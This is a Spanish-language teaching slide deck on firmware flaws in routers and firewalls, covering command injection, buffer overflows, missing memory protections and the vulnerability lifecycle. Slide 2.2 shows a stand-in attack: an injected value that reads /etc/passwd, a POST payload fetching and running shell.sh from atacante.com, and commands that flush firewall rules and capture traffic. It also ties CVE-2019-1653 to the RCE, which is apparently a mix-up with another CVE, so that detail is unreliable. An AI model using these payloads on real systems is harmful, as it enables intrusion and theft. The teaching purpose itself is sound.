Vulnerabilidades de Software y Código

DIAPOSITIVA 2.1

El Firmware: La Caja Negra

Antes de hablar de cómo se compromete un dispositivo perimetral, necesitas entender qué hay dentro. La respuesta es: firmware. Y es mucho más problemático de lo que parece.

¿Qué es el firmware?

El firmware es un programa grabado directamente en un chip de memoria dentro del dispositivo (router, firewall, switch). No es Windows ni Linux de escritorio — es un software embebido diseñado para arrancar rápido y controlar el hardware específico. Si lo borras, el dispositivo no arranca.

ANALOGÍA — El BIOS de tu computadora

Cuando enciendes tu PC, antes de Windows hay un programa corriendo: el BIOS o UEFI. Eso es firmware. En un router, el firmware hace algo similar pero permanente — controla todo el tráfico de red de forma continua. La diferencia es que el BIOS de tu PC se actualiza fácilmente. El firmware del router: no tanto.

¿POR QUÉ ES PELIGROSA?

Muchas veces queda expuesta a internet por error. Herramientas como Shodan indexan millones de estas interfaces. La interfaz procesa entradas del usuario — si ese procesamiento tiene fallos RCE, el atacante tiene una puerta directa.

¿POR QUÉ IMPORTA?

Si un atacante compromete esta capa, puede reescribir las reglas del firewall, interceptar todo el tráfico, o redirigir conexiones hacia servidores maliciosos. El impacto es total para toda la organización.

¿QUÉ ES?

Un programa en C o C++ que corre directamente sobre el hardware. Sin las capas de seguridad de un SO moderno. Pequeño, eficiente, y casi siempre propietario.

¿POR QUÉ ES UN PROBLEMA?
  • Código cerrado: los atacantes hacen ingeniería inversa — analizan el código máquina sin tener el original.
  • Sin protecciones modernas: sin ASLR, DEP, ni stack canaries — defensas estándar en cualquier PC.
  • Actualización muy lenta: el fabricante puede tardar meses. Mientras tanto, los dispositivos quedan expuestos.
  • Fin de soporte (EoL): cuando el modelo es viejo, no hay más parches — las vulnerabilidades son permanentes.

¿QUÉ ES?

Los circuitos integrados físicos: CPU (normalmente MIPS o ARM de bajo costo), RAM, memoria flash (donde vive el firmware), y chips ASIC para procesar paquetes.

¿IMPORTA PARA LA SEGURIDAD?

Sí. Sin chip de arranque seguro (Secure Boot), el firmware puede ser reemplazado por uno malicioso. Muchos procesadores de bajo costo no implementan extensiones de seguridad que tienen los chips de servidores.

El problema real: el ciclo de actualizaciones

Tu computadora personal

Windows Update, macOS, apt — parches automáticos y frecuentes. Si hay una vulnerabilidad crítica, el parche puede llegar en días y se instala solo.

Router / Firewall empresarial

El fabricante puede tardar meses en desarrollar un parche. Instalación manual con miedo a romper el dispositivo. Cuando llega al EoL, ya no hay más parches — nunca.

Eso significa que cualquier vulnerabilidad permanece activa, explotable y expuesta a internet las 24 horas. A eso le llamamos la caja negra — no sabes qué hay adentro, y nadie puede arreglarlo fácilmente.

¿Por qué "caja negra"?

Código propietario

Cisco, Netgear, Fortinet… no publican el código fuente. Los investigadores solo pueden hacer ingeniería inversa — proceso lento e incompleto.

Sin auditoría independiente

En software abierto como Linux, miles de personas revisan el código. En firmware propietario, solo empleados del fabricante lo ven — mucho menos control de calidad.

Fin de soporte (EoL)

Cuando el modelo es descontinuado, el fabricante deja de publicar parches. Las vulnerabilidades son permanentes. Única solución: reemplazar el hardware.

PARA RECORDAR

El firmware es la superficie de ataque más grande y menos vigilada de cualquier red empresarial. Es como la cerradura de la puerta principal — si tiene defectos de fábrica que nadie puede ver, cualquiera con la herramienta correcta puede abrirla. Y esa puerta lleva directamente a todo lo que hay adentro.

DIAPOSITIVA 2.2

Las Vulnerabilidades Estrella

Con esa caja negra sin actualizar como superficie de ataque, ¿qué tipo de fallos aparecen y cómo se explotan? Las dos más peligrosas y usadas en la práctica son RCE y Buffer Overflow.

Definición — RCE (Remote Code Execution)

El atacante logra ejecutar código en tu dispositivo solo a través de la red, sin acceso físico. El resultado habitual: una shell con privilegios de root — control total del dispositivo.

ANALOGÍA — La puerta de servicio mal diseñada

La interfaz web es una puerta trasera. Normalmente debería estar cerrada para extraños, pero alguien la dejó accesible desde la calle. La cerradura tiene un defecto — si metes una llave de cierta manera, abre. El atacante entra y tiene acceso libre a todo el edificio, incluidas las salas de control de seguridad.

¿Cómo ocurre? — paso a paso

Reconocimiento: encontrar la interfaz expuesta

El atacante usa Shodan (el "Google de los dispositivos conectados") para encontrar routers y firewalls con el panel de administración expuesto a internet.

product:"Cisco RV320 Dual WAN VPN" port:443 # Resultado: miles de firewalls con interfaz web expuesta en segundos

Identificar el punto vulnerable: validación incorrecta

Muchos formularios del firmware pasan la entrada del usuario directamente a comandos del SO sin verificar que sea segura.

char cmd[256]; sprintf(cmd, "ping -c 1 %s", hostname); system(cmd); /* ejecuta sin filtrar la entrada */ /* Si hostname = "8.8.8.8; cat /etc/passwd" Ejecuta: ping 8.8.8.8; cat /etc/passwd El ";" encadena comandos — el segundo se ejecuta igual */

Enviar el payload malicioso

POST /cgi-bin/diagnostic.cgi HTTP/1.1 target=8.8.8.8; wget http://atacante.com/shell.sh -O /tmp/s; sh /tmp/s # 1. ping 8.8.8.8 ← cubre el ataque # 2. descarga script malicioso # 3. lo ejecuta

Obtener una reverse shell con privilegios root

root@firewall-empresa:~# iptables -F # Todas las reglas del firewall borradas de un comando root@firewall-empresa:~# tcpdump -i eth0 -w /tmp/capture.pcap & # Capturando TODO el tráfico — contraseñas, emails, datos
¿QUÉ PUEDE HACER EL ATACANTE CON ROOT EN EL FIREWALL?

Ve todo el tráfico, elimina reglas de seguridad, redirige usuarios a sitios falsos, instala backdoors persistentes, usa el dispositivo como pivote para atacar la red interna, o lo convierte en parte de una botnet.

Caso real: CVE-2019-1653 — Cisco RV320

En enero de 2019, miles de firewalls Cisco RV320 tenían una vulnerabilidad RCE en su interfaz de diagnóstico. Un atacante podía ejecutar comandos sin autenticación. El exploit fue publicado y en menos de una semana herramientas automatizadas escaneaban todo internet buscando routers vulnerables.

Definición — Buffer Overflow

Ocurre cuando un programa escribe más datos de los que puede contener una zona de memoria reservada, "derramándose" hacia zonas adyacentes — incluyendo la dirección que le dice al programa a dónde ir después de una función.

ANALOGÍA — Los vasos numerados en la barra

Vasos del 0 al 31. Los vasos 0-7 son el buffer (8 unidades). Los vasos 28-31 tienen un papel con instrucciones: "después de servir, ve a la mesa 5". Si el camarero recibe 20 unidades para el vaso 0, el exceso se derrama al 28, mojando el papel. El atacante puede reemplazar ese papel con sus propias instrucciones: "ve a la cocina y abre la caja fuerte".

Conceptos fundamentales

¿Qué es un buffer?

Una zona de memoria de tamaño fijo. Si declaras char nombre[64] en C, el sistema reserva exactamente 64 bytes. El problema: nadie verifica que los datos no superen esos 64 bytes.

¿Qué es la dirección de retorno?

Cuando la función A llama a B, el sistema guarda la dirección de memoria a la que debe volver B cuando termine. Vive justo después del buffer en el stack. Si la sobrescribes, controlas a dónde va el programa.

¿Qué es el stack?

Región de memoria que crece hacia abajo. Guarda variables locales, parámetros y la dirección de retorno. El buffer y la dirección de retorno están en el stack — y son adyacentes en memoria.

¿Qué es el shellcode?

Código máquina compacto que el atacante inyecta en memoria. Su objetivo clásico: abrir una shell con acceso al SO. No puede contener bytes nulos (\x00) que interrumpirían la copia.

El código vulnerable

El programador usa funciones inseguras de C

void procesar_login(char *entrada_usuario) { char buffer[64]; strcpy(buffer, entrada_usuario); /* NO verifica tamaño */ verificar_credenciales(buffer); } /* Versión segura: */ strncpy(buffer, entrada_usuario, sizeof(buffer) - 1); buffer[63] = '\0';

El atacante construye el payload con precisión

payload = "A" * 64 # llenar el buffer + "B" * 8 # sobrescribir variables intermedias + "\x40\x11\x05\x08" # nueva dirección de retorno → shellcode + shellcode # Sin ASLR: las direcciones son SIEMPRE las mismas # El exploit funciona en TODOS los dispositivos del mismo modelo

La función retorna y salta al shellcode

El procesador lee la dirección de retorno manipulada y ejecuta el shellcode con permisos del proceso del firmware — casi siempre root.

¿POR QUÉ EN FIRMWARE ES TAN EFECTIVO?

En un PC moderno, ASLR aleatoriza las direcciones y DEP impide ejecutar shellcode en el stack. En firmware, estas protecciones generalmente no existen.

Los SO modernos tienen varias capas de defensa que hacen que explotar un buffer overflow sea muy difícil. El firmware de routers y firewalls frecuentemente carece de todas ellas.

ASLR
Address Space Layout Randomization — Aleatorización del espacio de direcciones

Cada arranque, las funciones y el stack se cargan en posiciones de memoria completamente aleatorias. El exploit que funcionó ayer no funciona hoy — el atacante necesitaría adivinar entre millones de posibilidades.

¿Por qué el firmware no lo tiene? Se compila para garantizar un arranque determinista y rápido — las mismas direcciones siempre. Sin ASLR, las direcciones son predecibles: el atacante las calcula una vez y el exploit funciona en todos los dispositivos del mismo modelo.

Windows / Mac / Linux ✓Firmware típico ✗
DEP / NX
Data Execution Prevention — Prevención de ejecución de datos

Marca las páginas de memoria que contienen datos como no ejecutables. Si el atacante inyecta shellcode en el buffer del stack, el procesador detecta que esa página está marcada como no ejecutable y lanza una excepción.

¿Por qué el firmware no lo tiene? Requiere soporte hardware (bit NX en Intel/AMD, bit XN en ARM). Muchos procesadores de bajo costo en routers no lo implementan, y aunque lo soporten, el firmware necesita activarlo explícitamente.

Windows / Mac / Linux ✓Firmware típico ✗
Stack Canaries
Valores centinela en el stack (Stack Protector)

El compilador inserta un valor aleatorio secreto justo antes de la dirección de retorno. Antes de que la función retorne, verifica que no haya cambiado. Si el overflow sobreescribió la dirección de retorno, necesariamente también sobreescribió el canario — el programa termina antes de ejecutar shellcode.

uint32_t canary = __stack_chk_guard; ← insertado por el compilador char buffer[64]; strcpy(buffer, entrada); if (canary != __stack_chk_guard) __stack_chk_fail(); ← si cambió, abortar

El nombre: viene de los canarios que los mineros llevaban a las minas de carbón. Si había gas tóxico, el canario moría primero alertando a los mineros.

Windows / Mac / Linux ✓Firmware: muy raro
Secure Boot
Arranque seguro — verificación de integridad del firmware

Antes de ejecutar el firmware, el hardware verifica su firma digital criptográfica. Si alguien lo modificó (instalando un backdoor), la firma no coincide y el dispositivo no arranca.

¿Por qué el firmware rara vez lo tiene? Requiere hardware especial (chip TPM) y toda la cadena de arranque firmada con claves del fabricante. Añade costo. Los dispositivos de gama baja y media generalmente no lo implementan.

PC / Mac ✓Firmware: muy raro
CONCLUSIÓN: EL FIRMWARE ES EL BLANCO PERFECTO

Sin ASLR las direcciones son predecibles. Sin DEP/NX el shellcode puede ejecutarse en el stack. Sin stack canaries el overflow no se detecta. Sin Secure Boot el firmware comprometido persiste. Esta combinación convierte al firmware en el objetivo ideal para un atacante sofisticado.

¿RCE y Buffer Overflow son lo mismo? No exactamente.

RCE — Es un resultado / impacto

Describe qué logró el atacante: ejecutar código remotamente. No dice cómo lo hizo. Puede lograrse mediante buffer overflow, inyección de comandos, deserialización insegura, etc.

Es como decir "el atacante entró al edificio" — es el resultado, no el método.

TIPO: Clase de impacto
Buffer Overflow — Es una técnica

Describe cómo lo hizo: desbordó un buffer para sobrescribir la memoria. Puede llevar a RCE, pero también puede causar solo un crash (DoS).

Es como decir "entró por la ventana rota" — es el método específico.

TIPO: Técnica de ataque
LA RELACIÓN ENTRE AMBOS

Buffer Overflow → sobrescribe dirección de retorno → redirige al shellcode → el shellcode corre → eso es RCE. El Buffer Overflow es el cómo; el RCE es el qué logró.

DIAPOSITIVA 2.3

El Ciclo de Vida de la Vulnerabilidad

Una vulnerabilidad tiene un ciclo de vida desde que nace hasta que (si acaso) desaparece. Entender cada fase es clave para saber cuándo y cómo ocurren los ataques. Haz clic en cada fase.

Un desarrollador escribe código con un error de programación — usar una función C insegura, no validar el tamaño de los datos de entrada, asumir que el usuario siempre mandará datos válidos.

void handle_username(char *input) { char buf[32]; strcpy(buf, input); /* ← aquí nace la vulnerabilidad */ autenticar(buf); }
TIEMPO DE VIDA LATENTE

El fallo puede vivir en el código durante años sin que nadie lo note. El dispositivo funciona perfectamente — no hay ningún síntoma visible.

Los investigadores descargan el firmware, lo extraen con binwalk, y analizan el código máquina con Ghidra o IDA Pro. También usan fuzzing — enviar miles de entradas aleatorias para ver cuáles causan comportamiento inesperado.

White Hat — Investigador ético

Lo descubre y lo reporta al fabricante de forma privada (responsible disclosure). Le da un plazo de 90 días para publicar el parche antes de revelar el fallo. Resultado: el fabricante puede arreglarlo antes de ataques masivos.

Black Hat — Actor malicioso

No reporta nada. Guarda el fallo para explotarlo, lo vende en mercados clandestinos (zero-days se cotizan en cientos de miles de dólares), o lo comparte con grupos de ataque. Resultado: el fabricante no sabe nada → Fase 3.

¿QUÉ SIGNIFICA "ZERO-DAY"?

"Zero days to fix" — el fabricante tiene cero días para arreglarlo porque no sabe que existe. Es la ventana entre que el fallo es descubierto por un actor malicioso y que el fabricante se entera.

No hay parche

El fabricante no puede publicar lo que no sabe que existe. El administrador más diligente no puede defenderse.

No hay detección

Los antivirus buscan firmas conocidas. Un zero-day no tiene firma — pasa invisible a todas las defensas basadas en firmas.

No hay CVE

Los administradores no pueden buscar información, no reciben alertas, no saben qué buscar en los logs.

No hay alerta posible

Los boletines de seguridad solo avisan de vulnerabilidades conocidas. Nadie puede avisar de algo que no está en los registros.

¿Cuánto puede durar? De días a años. Los zero-days de firewalls muy desplegados (Cisco, Fortinet, Palo Alto) se venden entre $100,000 y $2,500,000.

ANALOGÍA — La llave maestra con defecto secreto

Alguien descubrió que la llave maestra de tu edificio tiene un defecto: cualquier llave con cierta forma específica abre todas las puertas. El fabricante no lo sabe. Tú no lo sabes. El que lo descubrió tiene acceso libre en cualquier momento — y lo único que te protegería (cambiar todas las cerraduras) es algo que nadie te ha dicho que tienes que hacer.

CVE (Common Vulnerabilities and Exposures) — sistema de identificación pública mantenido por MITRE. Formato: CVE-AÑO-NÚMERO. Ejemplos: CVE-2021-44228 (Log4Shell, CVSS 10.0), CVE-2019-1653 (Cisco RV320).

¿Qué contiene un CVE?

Descripción técnica del fallo, sistemas afectados, puntuación CVSS (0-10), referencias a parches, y enlaces a pruebas de concepto si existen.

CVSS — ¿Cómo se puntúa?

Considera: vector de ataque (remoto/local), complejidad, privilegios requeridos, e impacto en confidencialidad, integridad y disponibilidad. CVSS 9.0-10.0 = crítico.

EL PROBLEMA PARADÓJICO DE LA DIVULGACIÓN

Una vez que el CVE es público, los ataques se disparan. Todos — incluidos atacantes sin mucho conocimiento — saben exactamente qué buscar. El tiempo para aplicar el parche antes de ser atacado se comprime a días u horas.

Miedo a brickear el dispositivo

Una actualización de firmware fallida puede dejar el dispositivo inoperable. Si le pasa al firewall principal, toda la empresa pierde conectividad.

Proceso complejo

Requiere: ventana de mantenimiento fuera de horario, backup de configuración, procedimiento de rollback, pruebas post-actualización. No es un clic.

Dispositivos EoL

Si el equipo llegó a fin de soporte, no hay parche. La única solución es reemplazar el hardware — caro, complejo y disruptivo.

Datos reales: adopción de parches en 90 días

Sistemas operativos de escritorio87%
Servidores gestionados en cloud62%
Firmware de routers y firewalls23%

Solo el 23% aplica el parche en 90 días. El 77% permanece vulnerable durante meses o años después de que la solución está disponible.

CONCLUSIÓN FINAL DEL CICLO

El ciclo completo puede tomar años. Y en muchos dispositivos — especialmente los más viejos — ese ciclo nunca termina: el EoL llega antes que el parche, y el hardware queda vulnerable de forma permanente. Por eso los dispositivos perimetrales son el vector favorito de grupos APT.

REFERENCIA

Glosario Completo

Todos los términos técnicos que aparecen en las diapositivas, explicados con precisión y en contexto.

Firmware sustantivo
Software grabado permanentemente en un chip de memoria flash dentro de un dispositivo de hardware. Es el sistema operativo del dispositivo — no puede borrarse sin perder la funcionalidad del hardware. Escrito normalmente en C o C++, de código propietario (cerrado), y actualizado muy raramente. En routers y firewalls, controla todo: arranque, procesamiento de paquetes, autenticación, reglas de seguridad.
RCE — Remote Code Execution clase de vulnerabilidad
Vulnerabilidad que permite a un atacante ejecutar código arbitrario en un sistema remoto solo a través de la red, sin acceso físico. Es una de las vulnerabilidades más críticas existentes (CVSS máximo 10.0). El resultado suele ser una shell con los privilegios del proceso vulnerable — en firmware, casi siempre root. Se puede lograr mediante: inyección de comandos, buffer overflow, deserialización insegura, vulnerabilidades en parsers, etc.
Buffer Overflow técnica de explotación
Error de programación que permite escribir más datos de los que caben en una zona de memoria reservada (buffer). Los bytes extras sobrescriben zonas adyacentes del stack, incluyendo la dirección de retorno. Si se sobrescribe con la dirección del shellcode del atacante, este gana control de ejecución. En firmware sin ASLR, DEP ni stack canaries, este ataque es particularmente efectivo porque no hay barreras que lo detengan.
Zero-Day tipo de vulnerabilidad
Vulnerabilidad conocida por actores maliciosos pero desconocida para el fabricante. "Zero days to fix" — el fabricante tiene cero días para arreglarlo porque no sabe que existe. Durante la zero-day window no hay parche, no hay CVE, no hay firma antivirus, y no hay defensa basada en conocimiento. Los zero-days de dispositivos muy desplegados se venden entre $100,000 y $2,500,000.
CVE — Common Vulnerabilities and Exposures sistema de identificación
Sistema estándar de identificación pública de vulnerabilidades mantenido por MITRE Corporation. Cada vulnerabilidad conocida recibe un identificador único formato CVE-AÑO-NÚMERO. La base de datos NVD del NIST enriquece cada CVE con puntuación CVSS, descripción técnica y referencias a soluciones.
CVSS — Common Vulnerability Scoring System métrica
Sistema estándar para puntuar la severidad de vulnerabilidades del 0.0 al 10.0. Evalúa: vector de ataque (red/local/físico), complejidad, privilegios requeridos, necesidad de interacción del usuario, e impacto en confidencialidad, integridad y disponibilidad. Escalas: 0.0=ninguno, 0.1-3.9=bajo, 4.0-6.9=medio, 7.0-8.9=alto, 9.0-10.0=crítico. Un RCE sin autenticación típicamente obtiene CVSS 9.8-10.0.
ASLR mecanismo de defensa
Address Space Layout Randomization. Aleatoriza la posición en memoria del stack, heap y bibliotecas en cada ejecución. Impide que un atacante pueda predecir las direcciones necesarias para un exploit de buffer overflow. Presente en Linux desde 2005, Windows desde Vista, macOS desde 10.5. Ausente en la mayoría del firmware por razones de determinismo y rendimiento.
DEP / NX — Data Execution Prevention mecanismo de defensa
Mecanismo que marca regiones de memoria como no ejecutables. El stack y el heap tienen el bit NX activado — el procesador rechaza ejecutar código desde esas zonas. Contramedida directa contra shellcode inyectado en buffers. Requiere soporte hardware y configuración explícita. El firmware frecuentemente no lo activa incluso cuando el hardware lo soportaría.
Stack Canary mecanismo de defensa
Valor secreto aleatorio insertado por el compilador entre las variables locales y la dirección de retorno en el stack. Antes de retornar de una función, el código verifica que ese valor no haya cambiado. Si un buffer overflow sobreescribió la dirección de retorno, necesariamente también sobreescribió el canario — el programa termina en lugar de ejecutar shellcode. Se activa compilando con el flag -fstack-protector de GCC.
Shellcode payload malicioso
Código máquina pequeño y cuidadosamente construido que un atacante inyecta en la memoria de un proceso vulnerable. Su objetivo clásico: abrir una shell (terminal de comandos) con acceso al SO. Tiene restricciones: no puede contener bytes nulos (\x00) que interrumpirían funciones de copia de strings en C, y debe ser autocontenido.
Dispositivo perimetral arquitectura de red
Dispositivo ubicado en el límite entre la red interna (confiable) y la red externa (internet). Incluye: routers, firewalls, VPN concentrators, proxies, IDS/IPS. Son el primer y último punto de control del tráfico. Su compromiso es catastrófico: el atacante obtiene visibilidad y control sobre todo el tráfico, puede abrir puertas a la red interna, y tiene posición privilegiada para atacar cualquier sistema interno.
EoL — End of Life / Fin de soporte estado del producto
Estado en que el fabricante deja de publicar actualizaciones, parches de seguridad y soporte técnico. Los dispositivos en EoL continúan funcionando — el problema es que las vulnerabilidades descubiertas después no tendrán corrección jamás. La única solución segura es reemplazar el hardware.
APT — Advanced Persistent Threat categoría de atacante
Grupos de atacantes altamente sofisticados, generalmente patrocinados por estados-nación, que realizan ataques dirigidos, sigilosos y prolongados. Son los principales compradores y usuarios de zero-days. Prefieren comprometer dispositivos perimetrales porque les da acceso persistente y difícil de detectar. Ejemplos: Volt Typhoon (China), Fancy Bear (Rusia), Lazarus Group (Corea del Norte).
Ingeniería inversa técnica
Proceso de analizar un sistema sin tener acceso al código fuente original. Para firmware: se descarga el archivo de actualización del sitio del fabricante, se extrae con binwalk, y se analiza el código máquina con Ghidra (NSA, open source) o IDA Pro. Es la única forma que tienen investigadores externos de buscar vulnerabilidades en firmware propietario.
